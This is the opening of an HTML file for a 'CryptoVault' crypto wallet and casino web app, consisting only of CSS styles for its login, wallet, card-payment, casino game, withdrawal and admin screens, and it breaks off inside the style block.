
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CryptoVault</title>
</head>
<body>
<style>
  :root {
    --color-background-primary: #1c1c1a;
    --color-background-secondary: #252523;
    --color-background-tertiary: #2e2e2b;
    --color-background-info: #0c447c;
    --color-background-success: #27500a;
    --color-background-warning: #633806;
    --color-background-danger: #791f1f;
    --color-text-primary: #eeecea;
    --color-text-secondary: #b4b2a9;
    --color-text-tertiary: #888780;
    --color-text-info: #85b7eb;
    --color-text-success: #97c459;
    --color-text-warning: #ef9f27;
    --color-text-danger: #f09595;
    --color-border-tertiary: rgba(255,255,255,0.10);
    --color-border-secondary: rgba(255,255,255,0.18);
    --color-border-primary: rgba(255,255,255,0.28);
    --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    --font-mono: "SFMono-Regular", Consolas, monospace;
    --border-radius-md: 8px;
    --border-radius-lg: 12px;
    --border-radius-xl: 16px;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: var(--font-sans); background: #1c1c1a; min-height: 100vh; }

  /* AUTH */
  .auth-screen { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 1rem; }
  .auth-card { background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-xl); padding: 2rem; width: 100%; max-width: 360px; }
  .auth-logo { font-size: 22px; font-weight: 500; color: var(--color-text-primary); margin-bottom: 2rem; text-align: center; }
  .auth-tabs { display: flex; gap: 4px; background: var(--color-background-secondary); border-radius: var(--border-radius-md); padding: 4px; margin-bottom: 1.5rem; }
  .auth-tab { flex: 1; padding: 8px; text-align: center; font-size: 13px; font-weight: 500; cursor: pointer; border-radius: 6px; color: var(--color-text-secondary); border: none; background: transparent; transition: all 0.15s; }
  .auth-tab.active { background: var(--color-background-primary); color: var(--color-text-primary); }
  .auth-input { width: 100%; padding: 10px 12px; background: var(--color-background-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); color: var(--color-text-primary); font-size: 14px; outline: none; margin-bottom: 10px; font-family: var(--font-sans); }
  .auth-input::placeholder { color: var(--color-text-tertiary); }
  .auth-input:focus { border-color: var(--color-border-primary); }
  .auth-btn { width: 100%; padding: 11px; background: var(--color-background-info); color: var(--color-text-info); border: none; border-radius: var(--border-radius-md); font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 4px; }
  .auth-btn:hover { opacity: 0.85; }
  .auth-error { font-size: 12px; color: var(--color-text-danger); margin-bottom: 10px; min-height: 16px; }

  /* DASHBOARD */
  .dash { display: none; padding: 1.5rem; max-width: 700px; margin: 0 auto; }
  .topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; }
  .logo { font-size: 18px; font-weight: 500; color: var(--color-text-primary); }
  .topbar-right { display: flex; align-items: center; gap: 10px; }
  .badge { font-size: 11px; padding: 3px 8px; background: var(--color-background-success); color: var(--color-text-success); border-radius: 20px; }
  .admin-badge { background: #450a0a; color: #f87171; }
  .cf-seq-builder { display: flex; align-items: center; gap: 6px; flex-wrap: wrap; flex: 1; }
  .cf-seq-btn { font-size: 12px; padding: 3px 10px; background: #1c1c1a; border: 0.5px solid #b45309; border-radius: 20px; color: #f59e0b; cursor: pointer; font-weight: 600; }
  .cf-seq-btn:hover { background: #2a1a00; }
  .cf-seq-pills { display: flex; gap: 4px; flex-wrap: wrap; }
  .cf-seq-pill { font-size: 11px; padding: 2px 8px; border-radius: 20px; font-weight: 700; }
  .cf-seq-pill.heads { background: #1a3a1a; color: #4ade80; }
  .cf-seq-pill.tails { background: #1a1a3a; color: #93c5fd; }
  .cf-seq-clear { font-size: 11px; padding: 2px 7px; background: transparent; border: 0.5px solid rgba(240,100,100,0.4); border-radius: 20px; color: #f87171; cursor: pointer; margin-left: 4px; }

  .cf-multi-track { display: flex; flex-direction: column; gap: 6px; margin-bottom: 12px; }
  .cf-multi-row { display: flex; align-items: center; gap: 10px; padding: 10px 14px; border-radius: var(--border-radius-md); border: 0.5px solid var(--color-border-tertiary); transition: all 0.2s; }
  .cf-multi-inactive { background: var(--color-background-secondary); opacity: 0.45; }
  .cf-multi-active { background: var(--color-background-tertiary); border-color: var(--color-border-secondary); opacity: 1; }
  .cf-multi-won { background: var(--color-background-success); border-color: var(--color-text-success); opacity: 1; }
  .cf-multi-lost { background: var(--color-background-danger); border-color: var(--color-text-danger); opacity: 1; }
  .cf-round-num { font-size: 12px; color: var(--color-text-tertiary); width: 36px; flex-shrink: 0; }
  .cf-round-mult { font-size: 14px; font-weight: 700; color: var(--color-text-warning); font-family: var(--font-mono); flex: 1; }
  .cf-round-result { font-size: 14px; font-weight: 600; color: var(--color-text-secondary); }
  .casino-btn { font-size: 12px; padding: 4px 10px; background: var(--color-background-warning); color: var(--color-text-warning); border: none; border-radius: 20px; cursor: pointer; font-weight: 500; }
  .casino-btn:hover { opacity: 0.85; }
  .logout-btn { font-size: 12px; color: var(--color-text-tertiary); background: none; border: none; cursor: pointer; padding: 4px 8px; }
  .logout-btn:hover { color: var(--color-text-secondary); }
  .wallet-row { font-size: 11px; color: var(--color-text-tertiary); font-family: var(--font-mono); margin-bottom: 1rem; display: flex; align-items: center; gap: 8px; }
  .copy-addr { font-size: 11px; color: var(--color-text-info); background: none; border: none; cursor: pointer; padding: 0; }

  /* BALANCE CARD */
  .balance-card { background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-lg); padding: 1.5rem; margin-bottom: 1rem; }
  .balance-card-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
  .bal-amount { font-size: 36px; font-weight: 500; color: var(--color-text-primary); display: flex; align-items: center; justify-content: space-between; }
  .bal-label { font-size: 12px; color: var(--color-text-secondary); text-transform: uppercase; letter-spacing: 0.04em; }
  .cashout-pill-btn { font-size: 13px; padding: 8px 12px; background: var(--color-background-primary); color: var(--color-text-primary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); cursor: pointer; font-weight: 500; transition: background 0.15s; align-self: center; }
  .cashout-pill-btn:hover:not(:disabled) { background: var(--color-background-secondary); }
  .cashout-pill-btn:disabled { opacity: 0.35; cursor: not-allowed; }
  .bal-amount { font-size: 36px; font-weight: 500; color: var(--color-text-primary); }
  .bal-hint { color: var(--color-text-tertiary); margin-top: 4px; font-size: 13px; }

  .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 1rem; }
  .action-btn { background: var(--color-background-primary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); padding: 12px; cursor: pointer; font-size: 13px; font-weight: 500; color: var(--color-text-primary); transition: background 0.15s; text-align: left; }
  .action-btn:hover:not(:disabled) { background: var(--color-background-secondary); }
  .action-btn:disabled { opacity: 0.35; cursor: not-allowed; }
  .action-btn .btn-icon { font-size: 16px; display: block; margin-bottom: 4px; }

  .section-label { font-size: 12px; color: var(--color-text-secondary); text-transform: uppercase; letter-spacing: 0.04em; margin-bottom: 8px; }

  /* COIN CARDS - clickable */
  .coins-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 1rem; }
  .coin-card {
    background: var(--color-background-primary);
    border: 0.5px solid var(--color-border-tertiary);
    border-radius: var(--border-radius-md);
    padding: 12px;
    cursor: pointer;
    transition: background 0.15s, border-color 0.15s;
    user-select: none;
  }
  .coin-card:hover { background: var(--color-background-secondary); border-color: var(--color-border-secondary); }
  .coin-card.active { border-color: var(--color-text-info); background: rgba(12,68,124,0.35); }
  .coin-card.active .coin-name { color: var(--color-text-info); }
  .coin-name { font-size: 12px; color: var(--color-text-secondary); margin-bottom: 2px; display: flex; align-items: center; gap: 5px; }
  .coin-ticker-badge { font-size: 10px; background: var(--color-background-secondary); color: var(--color-text-tertiary); padding: 1px 5px; border-radius: 4px; }
  .coin-amount { font-size: 16px; font-weight: 500; color: var(--color-text-primary); }
  .coin-usd { font-size: 12px; color: var(--color-text-secondary); }

  /* COIN WALLET PANEL */
  .coin-wallet-panel {
    background: var(--color-background-secondary);
    border: 0.5px solid var(--color-border-secondary);
    border-radius: var(--border-radius-lg);
    padding: 1.25rem 1.25rem 1rem;
    margin-bottom: 1rem;
    display: none;
  }
  .coin-wallet-panel.open {
    display: block;
    animation: panelIn 0.18s ease;
  }
  @keyframes panelIn {
    from { opacity: 0; transform: translateY(-5px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  .cwp-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
  .cwp-title { display: flex; align-items: center; gap: 8px; }
  .cwp-symbol { font-size: 20px; }
  .cwp-name { font-size: 15px; font-weight: 500; color: var(--color-text-primary); }
  .cwp-close { background: none; border: none; color: var(--color-text-tertiary); font-size: 16px; cursor: pointer; padding: 2px 5px; border-radius: 4px; }
  .cwp-close:hover { color: var(--color-text-secondary); background: var(--color-background-tertiary); }
  .cwp-amounts { display: flex; gap: 20px; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 0.5px solid var(--color-border-tertiary); }
  .cwp-amt-label { font-size: 11px; color: var(--color-text-tertiary); text-transform: uppercase; letter-spacing: 0.04em; margin-bottom: 3px; }
  .cwp-amt-val { font-size: 20px; font-weight: 500; color: var(--color-text-primary); font-family: var(--font-mono); }
  .cwp-amt-usd { font-size: 12px; color: var(--color-text-secondary); margin-top: 1px; }
  .cwp-actions { display: flex; gap: 8px; }
  .cwp-btn { flex: 1; padding: 8px 6px; border-radius: var(--border-radius-md); font-size: 12px; font-weight: 500; cursor: pointer; border: 0.5px solid var(--color-border-secondary); background: var(--color-background-primary); color: var(--color-text-secondary); transition: all 0.12s; text-align: center; }
  .cwp-btn:hover { color: var(--color-text-primary); border-color: var(--color-border-primary); }
  .cwp-btn.buy { background: var(--color-background-info); color: var(--color-text-info); border-color: transparent; }
  .cwp-btn.buy:hover { opacity: 0.85; }

  /* TX LIST */
  .tx-list { background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-lg); overflow: hidden; margin-bottom: 1rem; }
  .tx-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 1rem; border-bottom: 0.5px solid var(--color-border-tertiary); }
  .tx-item:last-child { border-bottom: none; }
  .tx-left { display: flex; align-items: center; gap: 10px; }
  .tx-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 500; flex-shrink: 0; }
  .tx-icon.recv { background: var(--color-background-success); color: var(--color-text-success); }
  .tx-icon.sent { background: var(--color-background-danger); color: var(--color-text-danger); }
  .tx-icon.swap { background: var(--color-background-info); color: var(--color-text-info); }
  .tx-name { font-size: 14px; font-weight: 500; color: var(--color-text-primary); }
  .tx-date { font-size: 12px; color: var(--color-text-secondary); }
  .tx-amount { font-size: 14px; font-weight: 500; white-space: nowrap; }
  .tx-amount.pos { color: var(--color-text-success); }
  .tx-amount.neg { color: var(--color-text-danger); }
  .empty-tx { padding: 2rem; text-align: center; font-size: 13px; color: var(--color-text-tertiary); }

  /* MODAL */
  .modal-bg { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; align-items: center; justify-content: center; padding: 1rem; }
  .modal-bg.open { display: flex; }
  .modal { background: var(--color-background-primary); border-radius: var(--border-radius-lg); border: 0.5px solid var(--color-border-tertiary); padding: 1.5rem; width: 100%; max-width: 340px; }
  .modal h3 { font-size: 16px; font-weight: 500; margin-bottom: 1rem; color: var(--color-text-primary); }
  .modal input, .modal select { width: 100%; margin-bottom: 10px; font-size: 14px; padding: 8px 10px; border-radius: var(--border-radius-md); border: 0.5px solid var(--color-border-secondary); background: var(--color-background-secondary); color: var(--color-text-primary); outline: none; font-family: var(--font-sans); }
  .modal input::placeholder { color: var(--color-text-tertiary); }
  .modal-actions { display: flex; gap: 8px; margin-top: 4px; }
  .btn-primary { flex: 1; padding: 9px; background: var(--color-background-info); color: var(--color-text-info); border: none; border-radius: var(--border-radius-md); font-size: 14px; font-weight: 500; cursor: pointer; }
  .btn-primary:hover:not(:disabled) { opacity: 0.85; }
  .btn-cancel { padding: 9px 14px; background: var(--color-background-secondary); color: var(--color-text-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); font-size: 14px; cursor: pointer; }

  /* CASHOUT MODAL extras */
  .co-hint { font-size: 11px; color: var(--color-text-tertiary); margin-top: -6px; margin-bottom: 10px; }
  .co-divider { height: 0.5px; background: var(--color-border-tertiary); margin: 4px 0 12px; }

  /* BUY MODAL */
  .buy-modal { max-width: 360px; }
  .amount-row { display: flex; gap: 8px; margin-bottom: 14px; align-items: center; }
  .amount-row input { margin-bottom: 0; flex: 1; font-size: 22px; font-weight: 500; }
  .amount-row select { width: auto; margin-bottom: 0; }
  .card-wrap { margin-bottom: 16px; }
  .credit-card { width: 100%; aspect-ratio: 1.586; border-radius: 14px; padding: 18px 20px; display: flex; flex-direction: column; justify-content: space-between; position: relative; overflow: hidden; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 45%, #0f3460 100%); border: 0.5px solid rgba(255,255,255,0.15); }
  .card-shine { position: absolute; inset: 0; background: linear-gradient(135deg, rgba(255,255,255,0.08) 0%, transparent 55%); pointer-events: none; }
  .card-top { display: flex; justify-content: space-between; align-items: flex-start; }
  .card-chip { width: 36px; height: 28px; border-radius: 5px; background: linear-gradient(135deg, #c9952a, #f0c96e, #b8922d); display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr 1fr; gap: 2px; padding: 4px; }
  .chip-line { background: rgba(0,0,0,0.22); border-radius: 1px; }
  .chip-center { grid-column: 1 / -1; background: rgba(0,0,0,0.12); border-radius: 1px; }
  .card-network { font-size: 22px; font-weight: 700; letter-spacing: -1px; color: rgba(255,255,255,0.88); font-style: italic; }
  .card-number { font-family: var(--font-mono); font-size: 15px; letter-spacing: 3px; color: rgba(255,255,255,0.9); text-align: center; }
  .card-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
  .card-field-label { font-size: 9px; text-transform: uppercase; letter-spacing: 0.08em; color: rgba(255,255,255,0.45); margin-bottom: 2px; }
  .card-field-value { font-size: 12px; font-family: var(--font-mono); color: rgba(255,255,255,0.9); letter-spacing: 1px; }
  .card-field-value.placeholder { color: rgba(255,255,255,0.3); }
  .card-inputs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 4px; }
  .card-inputs input { margin-bottom: 0; font-family: var(--font-mono); letter-spacing: 1px; }
  .card-inputs .full { grid-column: 1 / -1; }

  .toast { position: fixed; bottom: 20px; right: 20px; background: var(--color-background-success); color: var(--color-text-success); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-md); padding: 10px 16px; font-size: 13px; font-weight: 500; display: none; z-index: 200; }
  .toast.error { background: var(--color-background-danger); color: var(--color-text-danger); }
  .hint-bar { font-size: 12px; color: var(--color-text-tertiary); text-align: center; padding: 4px 0 1rem; }

  /* CASINO LOBBY */
  .casino { display: none; padding: 1.5rem; max-width: 700px; margin: 0 auto; }
  .casino-topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; }
  .back-btn { font-size: 13px; color: var(--color-text-secondary); background: var(--color-background-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); padding: 6px 12px; cursor: pointer; }
  .back-btn:hover { color: var(--color-text-primary); }
  .casino-bal { font-size: 13px; color: var(--color-text-secondary); }
  .casino-bal span { color: var(--color-text-primary); font-weight: 500; }
  .lobby-label { font-size: 12px; color: var(--color-text-secondary); text-transform: uppercase; letter-spacing: 0.04em; margin-bottom: 12px; }
  .lobby-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
  .lobby-card { background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-lg); padding: 1.25rem; cursor: pointer; transition: border-color 0.15s, background 0.15s; display: flex; flex-direction: column; gap: 10px; }
  .lobby-card:hover { border-color: var(--color-border-secondary); background: var(--color-background-secondary); }
  .lobby-card:last-child:nth-child(odd) { grid-column: 1 / -1; }
  .lobby-icon { width: 52px; height: 52px; border-radius: var(--border-radius-md); display: flex; align-items: center; justify-content: center; font-size: 26px; }
  .lobby-card-name { font-size: 16px; font-weight: 600; color: var(--color-text-primary); }
  .lobby-card-sub { font-size: 12px; color: var(--color-text-tertiary); }

  /* GAME PAGE */
  .game-page { display: none; padding: 1.5rem; max-width: 700px; margin: 0 auto; }
  .game-page-topbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; }
  .game-inner { background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-lg); padding: 1.5rem; }
  .game-inner-title { font-size: 18px; font-weight: 600; color: var(--color-text-primary); margin-bottom: 4px; }
  .game-inner-desc { font-size: 12px; color: var(--color-text-tertiary); margin-bottom: 1.25rem; }
  .bet-row { display: flex; gap: 8px; margin-bottom: 12px; align-items: center; }
  .bet-input { flex: 1; padding: 10px 12px; background: var(--color-background-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); color: var(--color-text-primary); font-size: 15px; outline: none; font-family: var(--font-sans); }
  .bet-input::placeholder { color: var(--color-text-tertiary); }
  .half-btn { padding: 10px 12px; background: var(--color-background-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); color: var(--color-text-secondary); font-size: 12px; cursor: pointer; white-space: nowrap; }
  .half-btn:hover { color: var(--color-text-primary); }
  .game-result { min-height: 48px; display: flex; align-items: center; justify-content: center; border-radius: var(--border-radius-md); margin-bottom: 12px; font-size: 14px; background: var(--color-background-secondary); color: var(--color-text-tertiary); }
  .game-result.win { background: var(--color-background-success); color: var(--color-text-success); }
  .game-result.lose { background: var(--color-background-danger); color: var(--color-text-danger); }
  .play-btn { width: 100%; padding: 11px; background: var(--color-background-warning); color: var(--color-text-warning); border: none; border-radius: var(--border-radius-md); font-size: 14px; font-weight: 500; cursor: pointer; }
  .play-btn:hover:not(:disabled) { opacity: 0.85; }
  .play-btn:disabled { opacity: 0.4; cursor: not-allowed; }
  .coin-flip-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
  .side-btn { padding: 12px; border-radius: var(--border-radius-md); border: 0.5px solid var(--color-border-secondary); background: var(--color-background-secondary); color: var(--color-text-secondary); font-size: 15px; font-weight: 500; cursor: pointer; text-align: center; transition: all 0.15s; }
  .side-btn.selected { border-color: var(--color-text-warning); color: var(--color-text-warning); background: var(--color-background-warning); }
  .dice-options { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
  .dice-opt { padding: 8px 14px; border-radius: var(--border-radius-md); border: 0.5px solid var(--color-border-secondary); background: var(--color-background-secondary); color: var(--color-text-secondary); font-size: 14px; cursor: pointer; transition: all 0.15s; }
  .dice-opt.selected { border-color: var(--color-text-info); color: var(--color-text-info); background: var(--color-background-info); }
  .crash-display { font-size: 48px; font-weight: 700; text-align: center; font-family: var(--font-mono); color: var(--color-text-primary); padding: 16px 0; }
  .crash-display.crashed { color: var(--color-text-danger); }
  .crash-display.safe { color: var(--color-text-success); }
  .crash-bar-wrap { width: 100%; height: 6px; background: var(--color-background-secondary); border-radius: 99px; margin-bottom: 12px; overflow: hidden; }
  .crash-bar { height: 100%; width: 0%; background: var(--color-text-success); border-radius: 99px; transition: width 0.1s linear; }
  .crash-bar.danger { background: var(--color-text-danger); }
  .crash-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
  .cashout-btn { padding: 11px; background: var(--color-background-success); color: var(--color-text-success); border: none; border-radius: var(--border-radius-md); font-size: 14px; font-weight: 500; cursor: pointer; }
  .cashout-btn:disabled { opacity: 0.35; cursor: not-allowed; }
  .mines-controls { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
  .mines-select { padding: 10px 12px; background: var(--color-background-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); color: var(--color-text-primary); font-size: 14px; outline: none; font-family: var(--font-sans); }
  .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; margin-bottom: 12px; }
  .mine-cell { aspect-ratio: 1; border-radius: var(--border-radius-md); border: 0.5px solid var(--color-border-secondary); background: var(--color-background-secondary); cursor: pointer; font-size: 20px; display: flex; align-items: center; justify-content: center; transition: background 0.12s, transform 0.1s, border-color 0.12s; user-select: none; overflow: hidden; }
  .mine-cell:hover:not(.revealed):not(.disabled) { background: var(--color-background-tertiary); border-color: var(--color-border-primary); transform: scale(1.04); }
  .mine-cell.revealed-gem { background: var(--color-background-success); border-color: var(--color-text-success); cursor: default; }
  .mine-cell.revealed-mine { background: var(--color-background-danger); border-color: var(--color-text-danger); cursor: default; animation: mineShake 0.3s ease; }
  .mine-cell.show-mine { background: #3a1212; border-color: #6b2222; cursor: default; }
  .mine-cell.disabled { cursor: default; }
  .mines-multiplier { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
  .mines-multiplier .mult-val { font-size: 20px; font-weight: 600; color: var(--color-text-success); font-family: var(--font-mono); }
  .mines-profit { font-size: 13px; color: var(--color-text-tertiary); }
  .cashout-mines-btn { width: 100%; padding: 11px; background: var(--color-background-success); color: var(--color-text-success); border: none; border-radius: var(--border-radius-md); font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 8px; }
  .cashout-mines-btn:disabled { opacity: 0.35; cursor: not-allowed; }
  .cashout-mines-btn:hover:not(:disabled) { opacity: 0.85; }

  /* BLACKJACK TABLE */
  .bj-table-wrap { background: #0d2818; border: 2px solid rgba(255,255,255,0.08); border-radius: 80px; padding: 2rem 1.5rem; margin-bottom: 1.25rem; min-height: 280px; display: flex; flex-direction: column; justify-content: space-between; position: relative; }
  .bj-zone-label { font-size: 10px; color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 10px; text-align: center; }
  .bj-score-wrap { text-align: center; margin-top: 8px; }
  .bj-cards-row { display: flex; gap: 10px; flex-wrap: wrap; min-height: 90px; align-items: center; justify-content: center; }
  .bj-score-badge { display: inline-flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.12); color: #fff; font-size: 13px; font-weight: 600; padding: 3px 10px; border-radius: 20px; margin-top: 8px; font-family: var(--font-mono); }
  .bj-divider { height: 1px; background: rgba(255,255,255,0.06); margin: 1rem 0; }
  .bj-actions { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 4px; }
  .bj-deal-row { margin-top: 4px; }

  /* PLAYING CARDS */
  .playing-card {
    width: 62px; height: 88px; border-radius: 8px;
    background: #f7f3ee;
    border: 1px solid rgba(0,0,0,0.12);
    display: flex; flex-direction: column; justify-content: space-between;
    padding: 5px 6px;
    font-size: 15px; font-weight: 800; line-height: 1;
    flex-shrink: 0;
    box-shadow: 0 4px 12px rgba(0,0,0,0.4);
    animation: cardDeal 0.22s cubic-bezier(0.34,1.3,0.64,1);
    transform-origin: top center;
  }
  @keyframes cardDeal {
    from { transform: translateY(-30px) rotate(-8deg) scale(0.7); opacity: 0; }
    to   { transform: translateY(0) rotate(0deg) scale(1); opacity: 1; }
  }
  .playing-card .c-top { align-self: flex-start; display: flex; flex-direction: column; align-items: flex-start; gap: 0px; }
  .playing-card .c-bot { align-self: flex-end; display: flex; flex-direction: column; align-items: flex-end; gap: 0px; transform: rotate(180deg); }
  .playing-card .c-rank { font-size: 16px; font-weight: 800; line-height: 1; }
  .playing-card .c-suit { font-size: 12px; line-height: 1; }
  .playing-card.red { color: #c0392b; }
  .playing-card.black { color: #1a1a18; }
  .playing-card.face-down {
    background: linear-gradient(135deg, #1e3a7a 25%, #162d60 25%, #162d60 50%, #1e3a7a 50%, #1e3a7a 75%, #162d60 75%);
    background-size: 12px 12px;
    border-color: rgba(255,255,255,0.1);
    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
  }

  /* CASHOUT WITHDRAWAL OVERLAY */
  .withdrawal-overlay {
    display: none; position: fixed; inset: 0; z-index: 400;
    background: rgba(0,0,0,0.78);
    align-items: center; justify-content: center;
  }
  .withdrawal-overlay.open { display: flex; }
  .withdrawal-box {
    background: var(--color-background-primary);
    border: 0.5px solid var(--color-border-secondary);
    border-radius: var(--border-radius-xl);
    padding: 2.5rem 2rem;
    width: 100%; max-width: 280px;
    text-align: center;
  }
  .wd-spinner {
    width: 48px; height: 48px;
    border: 3px solid rgba(255,255,255,0.08);
    border-top-color: var(--color-text-success);
    border-radius: 50%;
    animation: spin 0.75s linear infinite;
    margin: 0 auto 16px;
  }
  .wd-check {
    display: none;
    width: 48px; height: 48px;
    background: var(--color-background-success);
    border: 2px solid var(--color-text-success);
    border-radius: 50%;
    align-items: center; justify-content: center;
    margin: 0 auto 16px;
    font-size: 22px;
    color: var(--color-text-success);
    animation: popIn 0.35s cubic-bezier(0.34,1.56,0.64,1);
  }
  @keyframes popIn { from { transform: scale(0.2); opacity: 0; } to { transform: scale(1); opacity: 1; } }
  .wd-title { font-size: 15px; font-weight: 500; color: var(--color-text-primary); margin-bottom: 5px; }
  .wd-sub { font-size: 12px; color: var(--color-text-tertiary); line-height: 1.5; }

  @keyframes mineShake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
  @keyframes gemPop { 0% { transform: scale(0.5); opacity: 0; } 60% { transform: scale(1.15); } 100% { transform: scale(1); opacity: 1; } }
  .mine-cell.revealed-gem .cell-inner { animation: gemPop 0.25s ease forwards; }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* LIMBO */
  .limbo-stage { background: #0d1321; border: 0.5px solid rgba(255,255,255,0.08); border-radius: var(--border-radius-lg); margin-bottom: 1rem; overflow: hidden; }
  .limbo-history { display: flex; gap: 6px; flex-wrap: wrap; padding: 10px 12px 0; min-height: 38px; align-items: center; }
  .limbo-pill { font-size: 12px; font-weight: 700; font-family: var(--font-mono); padding: 3px 10px; border-radius: 20px; animation: pillIn 0.2s cubic-bezier(0.34,1.4,0.64,1); }
  .limbo-pill.win { background: #14532d; color: #4ade80; }
  .limbo-pill.lose { background: #450a0a; color: #f87171; }
  @keyframes pillIn { from { transform: translateX(-6px); opacity:0; } to { transform: translateX(0); opacity:1; } }

  /* The fill bar + centered text block */
  .limbo-bar-wrap { position: relative; height: 110px; margin: 10px 12px 14px; border-radius: 10px; background: #1a2236; overflow: hidden; display: flex; align-items: center; justify-content: center; }
  .limbo-bar-fill { position: absolute; left: 0; top: 0; height: 100%; width: 0%; border-radius: 10px; transition: width 0.4s cubic-bezier(0.22,1,0.36,1); z-index: 0; }
  .limbo-bar-fill.win  { background: linear-gradient(90deg, rgba(20,83,45,0.9), rgba(22,163,74,0.7)); }
  .limbo-bar-fill.lose { background: linear-gradient(90deg, rgba(69,10,10,0.9), rgba(153,27,27,0.7)); }
  .limbo-bar-fill.idle { background: transparent; width: 100%; }
  .limbo-bar-target { position: absolute; top: 0; bottom: 0; width: 2px; background: rgba(255,255,255,0.2); z-index: 1; transition: left 0.2s; pointer-events: none; }
  .limbo-bar-center { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 2; }
  .limbo-mult { font-size: 56px; font-weight: 800; font-family: var(--font-mono); color: rgba(255,255,255,0.2); line-height: 1; pointer-events: none; text-shadow: none; }
  .limbo-mult.animating { animation: limboUp 0.3s cubic-bezier(0.22,1,0.36,1); }
  @keyframes limboUp {
    from { transform: translateY(18px); opacity: 0; }
    to   { transform: translateY(0);    opacity: 1; }
  }
  .limbo-mult.win  { color: #4ade80; text-shadow: 0 0 20px rgba(74,222,128,0.4); }
  .limbo-mult.lose { color: #f87171; text-shadow: 0 0 20px rgba(248,113,113,0.4); }

  .limbo-target-row { display: grid; grid-template-columns: 1fr auto 1fr; gap: 8px; align-items: end; margin-bottom: 10px; }
  .limbo-field-label { font-size: 11px; color: var(--color-text-tertiary); text-transform: uppercase; letter-spacing: 0.04em; margin-bottom: 6px; }
  .limbo-x-sep { font-size: 15px; color: var(--color-text-tertiary); padding-bottom: 11px; }
  .limbo-chance { font-size: 20px; font-weight: 700; color: var(--color-text-primary); font-family: var(--font-mono); padding: 10px 12px; background: var(--color-background-secondary); border: 0.5px solid var(--color-border-secondary); border-radius: var(--border-radius-md); }

  /* PLINKO */
  .plinko-buckets { display: flex; gap: 3px; justify-content: center; }
  .plinko-bucket { flex: 1; text-align: center; padding: 6px 2px; border-radius: 6px; font-size: 11px; font-weight: 700; font-family: var(--font-mono); transition: transform 0.15s, filter 0.15s; }
  .plinko-bucket.hit { transform: scale(1.15); filter: brightness(1.5); }

  /* ADMIN PANEL */
  .admin-panel { display:none; padding:1.5rem; max-width:700px; margin:0 auto; }
  .admin-panel-topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem; padding-bottom:1rem; border-bottom:0.5px solid var(--color-border-tertiary); }
  .admin-section-label { font-size:11px; color:#b45309; text-transform:uppercase; letter-spacing:0.06em; font-weight:600; margin-bottom:10px; }
  .admin-user-list { display:flex; flex-direction:column; gap:10px; }
  .admin-user-card { background:var(--color-background-primary); border:0.5px solid var(--color-border-tertiary); border-radius:var(--border-radius-lg); padding:1rem 1.25rem; }
  .admin-user-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
  .admin-user-name { font-size:14px; font-weight:600; color:var(--color-text-primary); }
  .admin-user-bal { font-size:13px; color:var(--color-text-success); font-family:var(--font-mono); font-weight:600; }
  .admin-user-wallet { font-size:11px; color:var(--color-text-tertiary); font-family:var(--font-mono); margin-bottom:10px; }
  .admin-user-holdings { display:grid; grid-template-columns:repeat(4,1fr); gap:6px; margin-bottom:10px; }
